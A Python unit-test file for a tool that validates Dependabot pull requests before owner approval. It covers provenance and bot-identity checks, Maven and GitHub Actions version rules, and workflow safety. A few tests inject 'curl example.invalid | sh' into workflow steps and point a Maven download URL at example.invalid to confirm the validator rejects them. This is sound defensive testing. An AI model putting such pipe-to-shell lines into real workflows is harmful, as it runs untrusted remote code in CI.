from __future__ import annotations

import json
import unittest
from datetime import datetime, timezone
from pathlib import Path

from dependency_governance import (
    ACTION_LINE,
    Assessment,
    GovernanceError,
    classify_ecosystem,
    compare_versions,
    event_pull_number,
    parse_dependabot_metadata,
    parse_positive_integer,
    reconcile_independently,
    reconcile_with_base_convergence,
    render_comment,
    select_qualification_run,
    should_bulk_reconcile,
    validate_actions_semantic_change,
    validate_config,
    validate_maven_semantic_change,
    validate_provenance,
    ensure_owner_review_and_approval,
    has_exact_owner_approval,
    request_dependabot_refresh,
    validate_signed_metadata,
    workflow_identity_matches,
)

ROOT = Path(__file__).resolve().parents[2]
CONFIG = json.loads(
    (ROOT / ".github" / "dependency-governance.json").read_text(encoding="utf-8")
)


def canonical_fixture() -> tuple[str, str, dict, dict]:
    base_sha = "a" * 40
    head_sha = "b" * 40
    pull = {
        "number": 54,
        "state": "open",
        "draft": False,
        "created_at": "2026-09-01T12:00:00Z",
        "commits": 1,
        "changed_files": 1,
        "labels": [],
        "user": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
        "base": {
            "ref": CONFIG["baseBranch"],
            "sha": base_sha,
            "repo": {"full_name": "o/r"},
        },
        "head": {
            "ref": "dependabot/github_actions/routine-actions",
            "sha": head_sha,
            "repo": {"full_name": "o/r"},
        },
    }
    commit = {
        "sha": head_sha,
        "author": {"login": CONFIG["botLogin"], "id": CONFIG["botUserId"]},
        "committer": {"login": CONFIG["trustedCommitterLogin"]},
        "commit": {
            "author": {
                "name": CONFIG["botLogin"],
                "email": CONFIG["botAuthorEmail"],
            },
            "committer": {
                "name": CONFIG["gitCommitterName"],
                "email": CONFIG["gitCommitterEmail"],
            },
            "verification": {
                "verified": True,
                "reason": "valid",
                "signature": "fixture-signature",
            },
            "message": (
                "deps(deps): bump actions/checkout\n\n---\nupdated-dependencies:\n"
                "- dependency-name: actions/checkout\n"
                "  dependency-version: '7.0.2'\n"
                "  dependency-type: direct:production\n"
                "  update-type: version-update:semver-patch\n"
                "...\n\n"
                + CONFIG["signedOffBy"]
            ),
        },
        "parents": [{"sha": base_sha}],
    }
    return base_sha, head_sha, pull, commit


class DependencyGovernanceTests(unittest.TestCase):
    def test_config_is_fail_closed(self) -> None:
        self.assertEqual(validate_config(CONFIG), [])
        major = {
            **CONFIG,
            "allowedActionUpdateTypes": [
                *CONFIG["allowedActionUpdateTypes"],
                "version-update:semver-major",
            ],
        }
        self.assertTrue(validate_config(major))
        self.assertTrue(validate_config({**CONFIG, "manualReviewPaths": []}))

    def test_positive_integer_parser(self) -> None:
        self.assertEqual(parse_positive_integer("54"), 54)
        for value in ("0", "-1", "1.5", "abc", "9007199254740992"):
            with self.assertRaises(GovernanceError):
                parse_positive_integer(value)

    def test_metadata_parser(self) -> None:
        _, _, _, commit = canonical_fixture()
        metadata = parse_dependabot_metadata(commit["commit"]["message"])
        self.assertEqual(metadata[0]["name"], "actions/checkout")
        self.assertEqual(metadata[0]["updateType"], "version-update:semver-patch")

    def test_signed_metadata_requires_dependency_records(self) -> None:
        _, _, _, commit = canonical_fixture()
        self.assertTrue(validate_signed_metadata(commit)["eligible"])
        self.assertFalse(
            validate_signed_metadata({"commit": {"message": CONFIG["signedOffBy"]}})[
                "eligible"
            ]
        )

    def test_provenance_accepts_only_canonical_untouched_dependabot_commit(self) -> None:
        base, _, pull, commit = canonical_fixture()
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_provenance_rejects_spoofed_bot_identity(self) -> None:
        base, _, pull, commit = canonical_fixture()
        commit = json.loads(json.dumps(commit))
        commit["author"]["id"] = 123
        commit["commit"]["author"]["email"] = "dependabot[bot]@example.invalid"
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        self.assertRegex("\n".join(result["reasons"]), r"numeric identity|author email")

    def test_provenance_rejects_non_github_materialization_and_invalid_signature(self) -> None:
        base, _, pull, commit = canonical_fixture()
        commit = json.loads(json.dumps(commit))
        commit["committer"]["login"] = "someone"
        commit["commit"]["verification"]["reason"] = "unknown_key"
        result = validate_provenance(
            pull,
            [commit],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        self.assertRegex("\n".join(result["reasons"]), r"materialized|signature")

    def test_provenance_rejects_human_second_commit_and_stale_base(self) -> None:
        base, _, pull, commit = canonical_fixture()
        pull2 = json.loads(json.dumps(pull))
        pull2["commits"] = 2
        result = validate_provenance(
            pull2,
            [commit, {"sha": "c" * 40}],
            base,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(result["eligible"])
        stale = validate_provenance(
            pull,
            [commit],
            "d" * 40,
            CONFIG,
            now=datetime(2026, 9, 2, 12, tzinfo=timezone.utc),
        )
        self.assertFalse(stale["eligible"])

    def test_provenance_rejects_age_and_manual_review_label(self) -> None:
        base, _, pull, commit = canonical_fixture()
        old = json.loads(json.dumps(pull))
        old["created_at"] = "2026-08-01T12:00:00Z"
        labeled = json.loads(json.dumps(pull))
        labeled["labels"] = [{"name": "manual-review"}]
        now = datetime(2026, 9, 2, 12, tzinfo=timezone.utc)
        self.assertFalse(validate_provenance(old, [commit], base, CONFIG, now=now)["eligible"])
        self.assertFalse(
            validate_provenance(labeled, [commit], base, CONFIG, now=now)["eligible"]
        )

    def test_ecosystem_classification_is_exact(self) -> None:
        self.assertEqual(
            classify_ecosystem([{"filename": "pom.xml"}], CONFIG), "maven"
        )
        self.assertEqual(
            classify_ecosystem(
                [
                    {"filename": "pom.xml"},
                    {"filename": ".mvn/wrapper/maven-wrapper.properties"},
                ],
                CONFIG,
            ),
            "maven",
        )
        self.assertEqual(
            classify_ecosystem([{"filename": ".github/workflows/ci.yml"}], CONFIG),
            "github-actions",
        )
        self.assertEqual(
            classify_ecosystem(
                [{"filename": "pom.xml"}, {"filename": "README.md"}], CONFIG
            ),
            "unknown",
        )

    def test_maven_signed_patch_versions_are_semantically_eligible(self) -> None:
        before = """<project>
  <properties>
    <jackson.version>2.22.2</jackson.version>
  </properties>
  <dependencyManagement>
    <dependencies>
      <dependency>
        <groupId>com.fasterxml.jackson</groupId>
        <artifactId>jackson-bom</artifactId>
        <version>${jackson.version}</version>
      </dependency>
    </dependencies>
  </dependencyManagement>
  <dependencies>
    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-simple</artifactId>
      <version>2.0.19</version>
    </dependency>
  </dependencies>
</project>"""
        after = before.replace("2.22.2", "2.22.3").replace("2.0.19", "2.0.20")
        metadata = [
            {
                "name": "com.fasterxml.jackson:jackson-bom",
                "version": "2.22.3",
                "updateType": "version-update:semver-patch",
            },
            {
                "name": "org.slf4j:slf4j-simple",
                "version": "2.0.20",
                "updateType": "version-update:semver-patch",
            },
        ]
        result = validate_maven_semantic_change(before, after, metadata, CONFIG)
        self.assertTrue(result["eligible"], result["reasons"])
        self.assertEqual(
            {change["name"] for change in result["changes"]},
            {"com.fasterxml.jackson:jackson-bom", "org.slf4j:slf4j-simple"},
        )

    def test_maven_rejects_plugins_structure_unsigned_and_major_changes(self) -> None:
        base = """<project>
  <properties>
    <jackson.version>2.22.2</jackson.version>
  </properties>
  <dependencyManagement>
    <dependencies>
      <dependency>
        <groupId>com.fasterxml.jackson</groupId>
        <artifactId>jackson-bom</artifactId>
        <version>${jackson.version}</version>
      </dependency>
    </dependencies>
  </dependencyManagement>
  <build><plugins><plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>3.6.0</version>
  </plugin></plugins></build>
</project>"""
        signed = [{
            "name": "com.fasterxml.jackson:jackson-bom",
            "version": "2.22.3",
            "updateType": "version-update:semver-patch",
        }]
        plugin = base.replace("3.6.0", "3.6.1")
        self.assertFalse(validate_maven_semantic_change(base, plugin, signed, CONFIG)["eligible"])
        major = base.replace("2.22.2", "3.0.0")
        self.assertFalse(validate_maven_semantic_change(base, major, [{
            **signed[0], "version": "3.0.0", "updateType": "version-update:semver-major",
        }], CONFIG)["eligible"])
        structure = base.replace("</properties>", "    <new.policy>true</new.policy>\n  </properties>")
        self.assertFalse(validate_maven_semantic_change(base, structure, signed, CONFIG)["eligible"])

    def test_maven_wrapper_and_dependency_group_is_semantically_eligible(self) -> None:
        pom_before = """<project>
  <dependencies>
    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-simple</artifactId>
      <version>2.0.19</version>
    </dependency>
  </dependencies>
</project>"""
        pom_after = pom_before.replace("2.0.19", "2.0.20")
        wrapper_before = (
            "wrapperVersion=3.3.4\n"
            "distributionType=only-script\n"
            "distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/"
            "3.9.16/apache-maven-3.9.16-bin.zip\n"
            f"distributionSha256Sum={'a' * 64}\n"
        )
        wrapper_after = wrapper_before.replace(
            "3.9.16/apache-maven-3.9.16-bin.zip",
            "3.10.0/apache-maven-3.10.0-bin.zip",
        ).replace("a" * 64, "b" * 64)
        metadata = [
            {
                "name": "org.slf4j:slf4j-simple",
                "version": "2.0.20",
                "updateType": "version-update:semver-patch",
            },
            {
                "name": "org.apache.maven:apache-maven",
                "version": "3.10.0",
                "updateType": "version-update:semver-minor",
            },
        ]
        result = validate_maven_semantic_change(
            pom_before,
            pom_after,
            metadata,
            CONFIG,
            wrapper_before,
            wrapper_after,
        )
        self.assertTrue(result["eligible"], result["reasons"])
        self.assertEqual(
            {change["name"] for change in result["changes"]},
            {"org.slf4j:slf4j-simple", "org.apache.maven:apache-maven"},
        )

    def test_maven_wrapper_rejects_unpinned_or_structural_mutation(self) -> None:
        pom = "<project></project>"
        before = (
            "wrapperVersion=3.3.4\n"
            "distributionType=only-script\n"
            "distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/"
            "3.9.16/apache-maven-3.9.16-bin.zip\n"
            f"distributionSha256Sum={'a' * 64}\n"
        )
        metadata = [{
            "name": "org.apache.maven:apache-maven",
            "version": "3.10.0",
            "updateType": "version-update:semver-minor",
        }]
        good = before.replace(
            "3.9.16/apache-maven-3.9.16-bin.zip",
            "3.10.0/apache-maven-3.10.0-bin.zip",
        ).replace("a" * 64, "b" * 64)
        malicious = good.replace("repo.maven.apache.org", "example.invalid")
        self.assertFalse(
            validate_maven_semantic_change(
                pom, pom, metadata, CONFIG, before, malicious
            )["eligible"]
        )
        unpinned = good.replace("b" * 64, "not-a-sha256")
        self.assertFalse(
            validate_maven_semantic_change(
                pom, pom, metadata, CONFIG, before, unpinned
            )["eligible"]
        )
        structural = good.replace("wrapperVersion=3.3.4", "wrapperVersion=3.3.5")
        self.assertFalse(
            validate_maven_semantic_change(
                pom, pom, metadata, CONFIG, before, structural
            )["eligible"]
        )
        major_metadata = [{
            **metadata[0],
            "version": "4.0.0",
            "updateType": "version-update:semver-major",
        }]
        major = before.replace(
            "3.9.16/apache-maven-3.9.16-bin.zip",
            "4.0.0/apache-maven-4.0.0-bin.zip",
        ).replace("a" * 64, "b" * 64)
        self.assertFalse(
            validate_maven_semantic_change(
                pom, pom, major_metadata, CONFIG, before, major
            )["eligible"]
        )

    def test_action_line_requires_immutable_sha_and_version_annotation(self) -> None:
        good = "      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1"
        nested = "        uses: actions/checkout@" + "a" * 40 + " # v7.0.1"
        self.assertIsNotNone(ACTION_LINE.fullmatch(good))
        self.assertIsNotNone(ACTION_LINE.fullmatch(nested))
        self.assertIsNone(ACTION_LINE.fullmatch("      - uses: actions/checkout@v7"))
        self.assertIsNone(ACTION_LINE.fullmatch("      - uses: ./local-action"))

    def test_actions_named_step_patch_update_is_eligible_without_yaml_structure_change(self) -> None:
        file = ".github/workflows/security.yml"
        before = (
            "steps:\n"
            "  - name: Initialize CodeQL\n"
            "    uses: github/codeql-action/init@" + "a" * 40 + " # v4.38.0\n"
        )
        after = (
            "steps:\n"
            "  - name: Initialize CodeQL\n"
            "    uses: github/codeql-action/init@" + "b" * 40 + " # v4.38.2\n"
        )
        metadata = [{
            "name": "github/codeql-action/init",
            "version": "4.38.2",
            "updateType": "version-update:semver-patch",
        }]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])

        changed_structure = after.replace(
            "    uses: github/codeql-action/init@",
            "    - uses: github/codeql-action/init@",
        )
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: changed_structure}, metadata, CONFIG
        )
        self.assertFalse(result["eligible"])
        self.assertIn(
            "changes YAML structure around an action reference",
            "\n".join(result["reasons"]),
        )

    def test_actions_patch_update_is_eligible(self) -> None:
        file = ".github/workflows/ci.yml"
        before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
        after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
        metadata = [
            {
                "name": "actions/checkout",
                "version": "7.0.2",
                "updateType": "version-update:semver-patch",
            }
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
        )
        self.assertTrue(result["eligible"], result["reasons"])

    def test_actions_major_and_non_uses_mutation_are_blocked(self) -> None:
        file = ".github/workflows/ci.yml"
        before = (
            "steps:\n  - uses: actions/checkout@"
            + "a" * 40
            + " # v7.0.1\n  - run: echo safe\n"
        )
        major = (
            "steps:\n  - uses: actions/checkout@"
            + "b" * 40
            + " # v8.0.0\n  - run: echo safe\n"
        )
        metadata = [
            {
                "name": "actions/checkout",
                "version": "8.0.0",
                "updateType": "version-update:semver-major",
            }
        ]
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: major}, metadata, CONFIG
        )
        self.assertFalse(result["eligible"])
        mutated = major.replace("echo safe", "curl example.invalid | sh")
        result = validate_actions_semantic_change(
            [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
        )
        self.assertFalse(result["eligible"])
        self.assertIn("outside an immutable uses reference", "\n".join(result["reasons"]))

    def test_protected_workflow_allows_only_exact_signed_action_pin_transition(self) -> None:
        for file in (
            ".github/workflows/security.yml",
            ".github/workflows/dependency-governance.yml",
        ):
            before = "steps:\n  - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
            after = "steps:\n  - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n"
            metadata = [{
                "name": "actions/checkout",
                "version": "7.0.2",
                "updateType": "version-update:semver-patch",
            }]
            result = validate_actions_semantic_change(
                [{"filename": file}], {file: before}, {file: after}, metadata, CONFIG
            )
            self.assertTrue(result["eligible"], result["reasons"])
            mutated = after + "  - run: curl example.invalid | sh\n"
            result = validate_actions_semantic_change(
                [{"filename": file}], {file: before}, {file: mutated}, metadata, CONFIG
            )
            self.assertFalse(result["eligible"])

    def test_version_comparison_treats_zero_minor_as_breaking_risk(self) -> None:
        self.assertEqual(compare_versions("7.0.1", "7.0.2"), "patch")
        self.assertEqual(compare_versions("7.0.1", "7.1.0"), "minor")
        self.assertEqual(compare_versions("7.0.1", "8.0.0"), "major")
        self.assertEqual(compare_versions("0.36.0", "0.37.0"), "major-risk")
        self.assertEqual(compare_versions("7.0.1", "6.9.9"), "downgrade")

    def test_workflow_identity_binds_name_path_event_head_branch_and_optional_pr(self) -> None:
        _, head, pull, _ = canonical_fixture()
        requirement = CONFIG["requiredWorkflows"][0]
        run = {
            "id": 1,
            "name": requirement["workflow"],
            "path": f".github/workflows/{requirement['file']}",
            "event": "pull_request",
            "head_sha": head,
            "head_branch": pull["head"]["ref"],
            "pull_requests": [],
            "updated_at": "2026-09-02T10:00:00Z",
        }
        self.assertTrue(workflow_identity_matches(run, pull, requirement))
        self.assertTrue(
            workflow_identity_matches(
                {**run, "pull_requests": [{"number": pull["number"]}]}, pull, requirement
            )
        )
        for mutation in (
            {"name": "fake"},
            {"path": ".github/workflows/fake.yml"},
            {"event": "push"},
            {"head_sha": "c" * 40},
            {"head_branch": "dependabot/other"},
            {"pull_requests": [{"number": 999}]},
        ):
            self.assertFalse(workflow_identity_matches({**run, **mutation}, pull, requirement))
        newer_wrong = {
            **run,
            "id": 2,
            "path": ".github/workflows/fake.yml",
            "updated_at": "2026-09-02T11:00:00Z",
        }
        self.assertEqual(select_qualification_run([newer_wrong, run], pull, requirement)["id"], 1)

    def test_manual_dispatch_input_is_strict(self) -> None:
        self.assertEqual(
            event_pull_number({"inputs": {"pr-number": "54"}}, "workflow_dispatch"), 54
        )
        for bad in ("0", "-1", "1.2", "nope"):
            with self.assertRaises(GovernanceError):
                event_pull_number({"inputs": {"pr-number": bad}}, "workflow_dispatch")

    def test_unassociated_workflow_run_falls_back_to_bulk_reconcile(self) -> None:
        self.assertTrue(should_bulk_reconcile("push", None))
        self.assertTrue(should_bulk_reconcile("schedule", None))
        self.assertTrue(should_bulk_reconcile("workflow_run", None))
        self.assertFalse(should_bulk_reconcile("workflow_run", 64))
        self.assertFalse(should_bulk_reconcile("pull_request_target", 64))
        self.assertFalse(should_bulk_reconcile("workflow_dispatch", 64))

    def test_schedule_reconciliation_isolates_failures(self) -> None:
        pulls = [{"number": 1}, {"number": 2}, {"number": 3}]
        visited: list[int] = []

        def processor(pull: dict) -> str:
            visited.append(pull["number"])
            if pull["number"] == 2:
                raise RuntimeError("boom")
            return "ok"

        results, failures = reconcile_independently(pulls, processor)
        self.assertEqual(visited, [1, 2, 3])
        self.assertEqual([number for number, _ in results], [1, 3])
        self.assertEqual(failures, [(2, "boom")])

    def test_comment_documents_safety_boundary(self) -> None:
        base, _, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": "pom.xml"}],
            ecosystem="maven",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": False, "reasons": ["fixture manual block"], "changes": []},
            qualification={
                "allSuccess": False,
                "anyFailed": False,
                "qualifications": [
                    {**item, "state": "not-evaluated", "runId": None}
                    for item in CONFIG["requiredWorkflows"]
                ],
            },
        )
        body = render_comment(assessment, CONFIG)
        self.assertIn("never rewrites Dependabot branches directly", body)
        self.assertIn("MANUAL / WAIT", body)

    def test_owner_review_refresh_and_approval_are_exact_head_and_idempotent(self) -> None:
        class OwnerApi:
            def __init__(self, login: str, user_id: int) -> None:
                self.identity = {"login": login, "id": user_id}
                self.comments: list[dict] = []
                self.reviews: list[dict] = []

            def get(self, path: str):
                if path != "https://api.github.com/user":
                    raise AssertionError(path)
                return self.identity

            def paginate(self, path: str):
                if path.endswith("/comments"):
                    return self.comments
                if path.endswith("/reviews"):
                    return self.reviews
                raise AssertionError(path)

            def post(self, path: str, payload: dict):
                if path.endswith("/comments"):
                    self.comments.append({"body": payload["body"], "user": self.identity})
                    return {}
                if path.endswith("/reviews"):
                    self.reviews.append({
                        "state": "APPROVED",
                        "commit_id": payload["commit_id"],
                        "user": self.identity,
                    })
                    return {}
                raise AssertionError(path)

        base, head, pull, commit = canonical_fixture()
        assessment = Assessment(
            pull=pull,
            base_sha=base,
            files=[{"filename": ".github/workflows/ci.yml"}],
            ecosystem="github-actions",
            provenance={"eligible": True, "reasons": [], "commit": commit},
            metadata={"eligible": True, "reasons": [], "metadata": []},
            semantic={"eligible": True, "reasons": [], "changes": []},
            qualification={"allSuccess": True, "anyFailed": False, "qualifications": []},
        )
        owner = OwnerApi(CONFIG["ownerApprovalLogin"], CONFIG["ownerApprovalUserId"])
        ensure_owner_review_and_approval(owner, assessment, CONFIG)
        self.assertTrue(has_exact_owner_approval(owner, pull["number"], head, CONFIG))
        ensure_owner_review_and_approval(owner, assessment, CONFIG)
        self.assertEqual(len(owner.comments), 1)
        self.assertEqual(len(owner.reviews), 1)

        stale = Assessment(
            pull=pull,
            base_sha="c" * 40,
            files=assessment.files,
            ecosystem=assessment.ecosystem,
            provenance={
                "eligible": False,
                "reasons": ["PR is not rebased directly on the current base branch head"],
                "commit": commit,
            },
            metadata=assessment.metadata,
            semantic=assessment.semantic,
            qualification=assessment.qualification,
        )
        self.assertTrue(request_dependabot_refresh(owner, stale, CONFIG))
        self.assertIn("@dependabot rebase", owner.comments[-1]["body"])
        before = len(owner.comments)
        self.assertTrue(request_dependabot_refresh(owner, stale, CONFIG))
        self.assertEqual(len(owner.comments), before)

        with self.assertRaises(GovernanceError):
            ensure_owner_review_and_approval(
                OwnerApi("github-actions[bot]", 41898282), assessment, CONFIG
            )

    def test_base_convergence_revisits_earlier_pr_after_later_merge(self) -> None:
        open_pulls = [{"number": 1}, {"number": 2}]
        visits: list[int] = []

        def list_pulls() -> list[dict]:
            return [dict(item) for item in open_pulls]

        def processor(pull: dict) -> dict:
            visits.append(pull["number"])
            if pull["number"] == 2:
                open_pulls[:] = [item for item in open_pulls if item["number"] != 2]
                return {"merged": True}
            return {"merged": False}

        results, failures, passes = reconcile_with_base_convergence(list_pulls, processor)
        self.assertEqual(visits, [1, 2, 1])
        self.assertEqual(passes, 2)
        self.assertEqual(failures, [])
        self.assertEqual([(n, p) for n, _, p in results], [(1, 1), (2, 1), (1, 2)])

    def test_privileged_workflow_never_checks_out_dependabot_head(self) -> None:
        workflow = (
            ROOT / ".github" / "workflows" / "dependency-governance.yml"
        ).read_text(encoding="utf-8")
        self.assertIn("pull_request_target:", workflow)
        self.assertIn("workflow_run:", workflow)
        self.assertIn("push:", workflow)
        self.assertIn("schedule:", workflow)
        self.assertIn("DEPENDABOT_OWNER_TOKEN", workflow)
        self.assertIn("ref: ${{ github.event.repository.default_branch }}", workflow)
        self.assertIn("persist-credentials: false", workflow)
        self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.pull_request\.head")
        self.assertNotRegex(workflow, r"ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha")
        self.assertIn("github.event.pull_request.head.ref || 'reconcile'", workflow)


if __name__ == "__main__":
    unittest.main(verbosity=2)
